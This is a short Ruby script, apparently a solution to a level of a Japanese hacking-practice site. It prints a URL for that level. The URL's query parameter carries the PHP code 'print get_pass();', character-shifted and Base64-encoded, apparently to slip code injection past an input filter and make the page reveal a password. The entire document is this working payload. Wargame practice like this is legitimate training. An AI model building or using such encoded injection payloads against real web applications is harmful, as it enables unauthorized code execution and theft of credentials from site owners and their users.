#!/usr/bin/ruby
require 'base64'
puts 'Open URL:'
puts 'http://www.hackerschool.jp/hack/take48.php?no='+Base64.encode64('print get_pass();'.bytes.map{|e|(e+(e>0x60?5:0)).chr}*'')